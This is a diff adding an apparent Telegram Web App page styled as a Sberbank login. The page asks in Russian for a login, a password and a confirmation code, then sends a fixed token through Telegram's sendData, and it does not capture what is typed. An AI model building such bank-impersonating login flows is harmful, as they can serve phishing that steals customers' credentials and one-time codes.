@@ -1,5 +1,64 @@
 <html>
+<head>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
 <body>
-<h1>Hello!</h1>
+<div class="login-form">
+    <img class="logo" src="sberbank-logo.svg" />
+    <div class="title login">Логин</div>
+    <input class="entry login" />
+    <div class="title password">Пароль</div>
+    <input class="entry password" type="password" />
+    <button id="login-button" class="button-success">Продолжить</button>
+    <button class="button-link">Отменить</button>
+</div>
+<div class="verification-form hidden">
+    <img class="logo" src="sberbank-logo.svg" />
+    <div class="title login">Код подтверждения</div>
+    <input class="entry login" />
+    <button id="verify-button" class="button-success">Продолжить</button>
+    <button class="button-link">Отменить</button>
+</div>
+<script>
+    var tg = window.Telegram.WebApp;
+    var loginForm = document.querySelector('.login-form');
+    var verificationForm = document.querySelector('.verification-form');
+    var loginButton = document.querySelector('#login-button');
+    var verifyButton = document.querySelector('#verify-button');
+
+    function login() {
+        setLoading(loginButton)
+        setTimeout(function () {
+            hideForm(loginForm)
+            showForm(verificationForm)
+        }, 1000)
+    }
+
+    function showForm(form) {
+        form.classList.remove('hidden');
+    }
+
+    function hideForm(form) {
+        form.classList.add('hidden');
+    }
+
+    function setLoading(button) {
+        button.classList.add('loading')
+    }
+
+    function verify() {
+        setLoading(verifyButton)
+        setTimeout(function () {
+            var data = JSON.stringify({ token: '6c10a344-bcd7-4262-8deb-7048cdcb46a5' })
+            tg.sendData(data)
+        })
+    }
+
+    loginButton.addEventListener('click', login);
+    verifyButton.addEventListener('click', verify);
+</script>
 </body>
 </html>
